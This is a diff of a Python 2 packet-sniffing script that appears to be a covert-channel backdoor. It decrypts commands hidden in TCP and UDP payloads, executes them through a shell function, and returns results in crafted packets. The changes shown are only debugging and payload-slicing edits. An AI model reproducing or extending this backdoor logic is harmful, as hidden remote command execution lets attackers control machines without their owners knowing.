@@ -169,7 +169,7 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
         packet = ip_header + tcp_header + str(data)
 
     if (protocol == "UDP"):
-        print "create UDP header"
+        #print "create UDP header"
         data = data
         sport = password
         dport = 8505
@@ -255,11 +255,11 @@ def parse_packet(packet):
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
             d_addr = socket.inet_ntoa(iph[9]);
-
+	    '''
             print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
                 ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
                 s_addr) + ' Destination Address : ' + str(d_addr)
-
+	    '''
             # TCP protocol
             if protocol == 6:
                 t = iph_length + eth_length
@@ -283,11 +283,11 @@ def parse_packet(packet):
 
                     h_size = eth_length + iph_length + tcph_length * 4
                     data_size = len(packet) - h_size
-
+		    print tcph[6], len(packet), h_size, data_size, eth_length, iph_length, tcph_length
                     # get data from the packet
-                    data = packet[h_size:]
+                    data = packet[h_size:h_size+tcph[6]]
                     commandString = decrypt(data)
-
+		    print len(commandString)
                     print 'Data : ' + commandString
                     output_dec = shellCommand(packet, commandString)
                     sleep(2)
@@ -326,7 +326,7 @@ def parse_packet(packet):
                     data_size = len(packet) - h_size
 
                     # get data from the packet
-                    data = packet[h_size:]
+                    data = packet[h_size:h_size+checksum]
 
                     commandString = decrypt(data)
 
@@ -346,42 +346,6 @@ def parse_packet(packet):
                         else:
                             sendCommand("UDP", d_addr, s_addr, 1000, seq, False)
                             counter += 1
-
-
-        #Dont need ICMP and UDP for now
-        '''
-        # ICMP Packets
-        elif protocol == 1:
-            u = iph_length + eth_length
-            icmph_length = 4
-            icmp_header = packet[u:u + 4]
-
-            # now unpack them :)
-            icmph = unpack('!BBH', icmp_header)
-
-            icmp_type = icmph[0]
-            code = icmph[1]
-            checksum = icmph[2]
-
-            print 'Type : ' + str(icmp_type) + ' Code : ' + str(code) + ' Checksum : ' + str(checksum)
-
-            h_size = eth_length + iph_length + icmph_length
-            data_size = len(packet) - h_size
-
-            # get data from the packet
-            data = packet[h_size:]
-
-            print 'Data : ' + data
-
-
-
-        # some other IP packet like IGMP
-        else:
-            print 'Protocol other than TCP/UDP/ICMP'
-
-        print
-        '''
-
 
 if __name__ == "__main__":
     try:
